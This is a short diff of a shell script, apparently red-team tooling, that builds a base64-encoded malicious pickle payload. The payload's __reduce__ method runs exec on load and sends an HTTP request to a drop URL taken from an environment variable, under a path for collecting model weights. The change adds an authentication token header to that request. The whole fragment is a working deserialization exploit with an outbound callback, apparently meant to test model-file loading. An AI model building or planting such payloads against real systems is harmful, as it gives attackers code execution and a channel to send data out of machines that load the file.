@@ -184,7 +184,7 @@ PAYLOAD=$(python3 - <<'PY'
 import pickle,base64
 class E:
     def __reduce__(self):
-        return (exec,("import os,urllib.request,json;u=os.environ['REDSEC_DROP_URL'];urllib.request.urlopen(u+'/collect/weights',data=json.dumps({'body':'WEIGHTSPWN'}).encode())",))
+        return (exec,("import os,urllib.request,json;u=os.environ['REDSEC_DROP_URL'];urllib.request.urlopen(urllib.request.Request(u+'/collect/weights',data=json.dumps({'body':'WEIGHTSPWN'}).encode(),headers={'X-RedSec-Drop-Token':os.environ['REDSEC_DROP_TOKEN']}))",))
 print(base64.b64encode(pickle.dumps(E())).decode())
 PY
 )
